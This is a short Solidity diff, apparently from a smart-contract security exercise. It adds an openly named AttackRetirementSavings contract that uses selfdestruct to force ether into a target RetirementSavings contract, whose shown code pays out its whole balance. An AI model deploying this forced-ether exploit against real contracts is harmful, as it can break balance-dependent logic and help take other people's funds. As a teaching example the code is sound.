@@ -32,3 +32,12 @@ contract RetirementSavings {
         payable(msg.sender).transfer(address(this).balance);
     }
 }
+
+contract AttackRetirementSavings {
+    
+    function attack(address _target) external {
+        selfdestruct(payable(_target));
+    }
+
+    receive() external payable {}
+}
